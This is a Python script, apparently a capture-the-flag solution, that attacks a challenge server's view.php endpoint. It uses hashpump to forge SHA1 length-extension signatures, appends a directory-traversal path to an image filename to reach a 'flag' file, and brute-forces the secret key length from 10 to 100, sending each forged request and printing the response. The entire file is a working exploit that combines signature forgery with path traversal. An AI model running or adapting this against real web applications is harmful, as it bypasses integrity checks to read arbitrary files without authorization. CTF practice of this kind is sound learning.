import subprocess
import urllib.parse
import requests

def run_hashpump(original_hash, original_data, append_data, key_length):
    # Run the hashpump command and capture the output
    result = subprocess.run(
        ["hashpump", "-s", original_hash, "-d", original_data, "-a", append_data, "-k", str(key_length)],
        capture_output=True, text=True
    )
    
    # Check if the command ran successfully
    if result.returncode != 0:
        return None, None
    
    # Split the output into lines
    lines = result.stdout.splitlines()
    
    # Find the line containing "predicted sig:"
    predicted_hash = None
    new_data = None
    for line in lines:
        if "predicted sig:" in line:
            predicted_hash = line.split("predicted sig: ")[1].strip()
        elif not line.startswith("mask:") and not line.startswith("progress:") and predicted_hash:
            new_data = line.strip()
            break
    
    if not predicted_hash or not new_data:
        return None, None
    
    return predicted_hash, new_data

def generate_url(base_url, pic_data, hash_value):
    # Properly decode the string representation with \x sequences to actual bytes
    pic_data_bytes = pic_data.encode('utf-8').decode('unicode_escape').encode('latin1')
    
    # URL encode the bytes properly
    encoded_pic_data = urllib.parse.quote_from_bytes(pic_data_bytes)
    
    # Construct the full URL
    return f"{base_url}?pic={encoded_pic_data}&hash={hash_value}"

def main():
    # Inputs
    original_hash = "06dadc9db741e1c2a91f266203f01b9224b5facf"
    original_data = "1.png"
    append_data = "/../../../../../../../../../../flag"
    base_url = "http://chal.competitivecyber.club:7777/view.php"
    
    # Loop through key lengths from 10 to 100
    for key_length in range(10, 101):
        print(f"Trying key length: {key_length}")
        
        # Run hashpump to get the new hash and data
        predicted_hash, new_data = run_hashpump(original_hash, original_data, append_data, key_length)
        
        # Check if hashpump executed correctly
        if not predicted_hash or not new_data:
            print(f"Failed to generate data for key length {key_length}")
            continue
        
        # Generate the full URL
        full_url = generate_url(base_url, new_data, predicted_hash)
        
        # Make the GET request to the generated URL
        try:
            response = requests.get(full_url)
            print(f"Key length {key_length}: HTTP Status Code {response.status_code}")
            print("Response content:\n", response.text)  # Print the full response content
            
            # If you want to break after the first successful response, uncomment the following line
            # break
        except requests.RequestException as e:
            print(f"Request failed for key length {key_length}: {e}")

if __name__ == "__main__":
    main()
